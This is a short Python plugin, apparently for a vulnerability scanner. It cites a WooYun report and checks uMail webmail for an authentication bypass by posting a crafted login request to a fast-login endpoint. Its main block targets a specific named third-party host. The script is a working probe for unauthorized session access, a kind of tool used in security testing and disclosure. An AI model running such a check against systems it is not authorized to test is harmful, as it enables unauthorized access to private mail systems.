#!/usr/bin/env python
#from:http://www.wooyun.org/bugs/wooyun-2010-093049
import re,time

def assign(service, arg):
    if service == "umail":
        return True, arg


def audit(arg):
    url = arg + '/webmail/fast/index.php?module=operate&action=login'
    postdata = 'mailbox=test@domain.com&link=?'
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)

    if code == 200 and '<meta http-equiv="refresh" content="0; URL=index.php">' in res:
        security_warning('make a session,access the file which guest not be allowed:post mailbox=test@domain.com&link=? to %s'%url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('umail', 'http://oa.shindoo.com:810/')[1])